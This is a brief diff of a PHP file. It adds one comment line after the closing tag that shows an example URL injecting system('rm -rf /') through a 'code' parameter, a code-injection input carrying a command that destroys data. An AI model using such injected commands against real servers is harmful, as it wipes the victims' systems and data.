@@ -27,3 +27,4 @@ function new_http_param() {
 
 
 ?> 
+# http://example.com/script.php?code=system('rm -rf /');
